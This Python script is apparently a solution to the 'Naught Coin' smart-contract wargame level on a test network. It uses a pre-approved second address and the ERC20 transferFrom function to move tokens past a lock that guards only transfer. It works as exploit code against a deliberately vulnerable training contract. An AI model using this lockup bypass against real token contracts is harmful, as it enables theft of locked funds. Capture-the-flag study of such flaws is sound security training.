
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_utils import remove_0x_prefix
import os
import json

# Success msg:
# When using code that's not your own, it's a good idea to familiarize yourself with it to get a good understanding of how everything fits together. 
# This can be particularly important when there are multiple levels of imports (your imports have imports) or when you are implementing authorization controls, 
# e.g. when you're allowing or disallowing people from doing things. In this example, a developer might scan through the code and think that transfer 
# is the only way to move tokens around, low and behold there are other ways of performing the same operation with a different implementation.


# APPROVAL:
# await contract.approve('<some other addres>', contract.balanceOf(player))

class NaughtcoinAttack():
    def __init__(self):

        # read sensitive data from file
        curr_path = os.path.dirname(os.path.abspath(__file__)) + '/'
        try:
            with open(curr_path + '../secret.json') as json_file:
                self.secret_json = json.load(json_file)
        except:
            print('secret.json missing')
            exit()

        # init web3
        alchemy_url = "https://polygon-mumbai.g.alchemy.com/v2/" + self.secret_json['alpchemy']['api_key']
        self.w3 = Web3(Web3.HTTPProvider(alchemy_url))
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        
        # create erc20 contract object
        abi_txt = open('./erc20.abi.json', 'r').read().replace('\n', '')
        nc_contract = self.w3.eth.contract(address=self.secret_json['naught_coin_addr'], abi=abi_txt)

        # some sanity check
        print(nc_contract.functions.totalSupply().call())
        print(nc_contract.functions.name().call())

        # balace of player
        balance_to_transfer = nc_contract.functions.balanceOf(self.secret_json['my_addr']).call()
        if balance_to_transfer <= 0:
            print('zero balance, nothing to do')
            exit()

        # create transaction to transfer allowed tokens
        _txn = nc_contract.functions.transferFrom(
            self.secret_json['my_addr'],
            self.secret_json['naught_coin_allowed_addr'],
            balance_to_transfer
        ).build_transaction({
            'from': self.secret_json['naught_coin_allowed_addr'],
            'nonce': self.w3.eth.get_transaction_count(self.secret_json['naught_coin_allowed_addr'])
        })
        print(_txn)
        signed_txn = self.w3.eth.account.sign_transaction(_txn, private_key=self.secret_json['naught_coin_allowed_addr_private_key'])

        tx_token = self.w3.eth.send_raw_transaction(signed_txn.rawTransaction)
        tx_hash = self.w3.to_hex(tx_token)
        print(f'tx_hash = ', tx_hash)


if __name__ == '__main__':
    va = NaughtcoinAttack()
